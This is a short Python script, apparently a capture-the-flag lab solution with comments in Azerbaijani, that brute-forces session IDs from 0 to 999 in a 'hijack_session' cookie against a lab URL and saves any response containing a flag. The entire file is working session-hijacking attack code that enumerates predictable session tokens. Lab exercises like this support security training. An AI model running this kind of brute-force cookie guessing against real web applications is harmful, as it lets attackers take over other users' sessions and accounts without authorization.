import requests

# Hədəf URL
url = "http://10.42.66.32/a1/hijack_session"

# Mümkün session ID-ləri sınamaq üçün siyahı
# Lab üçün çox güman ki, sadə artan rəqəmlərdir
for i in range(1000):  # 0-dan 999-a qədər test edirik
    session_id = f"{i}"  # pattern düzgün olarsa buraya dəyişdirin
    cookies = {"hijack_session": session_id}

    # Sorğu göndər
    response = requests.get(url, cookies=cookies)

    # Flag-i axtar
    if "FLAG" in response.text or "flag" in response.text:
        print(f"[+] Flag tapıldı: {response.text.strip()}")
        # Flag-i fayla yaz
        with open("0-flag.txt", "w") as f:
            f.write(response.text.strip())
        break
else:
    print("[-] Flag tapılmadı. Pattern düzgün deyil və ya range azdır.")
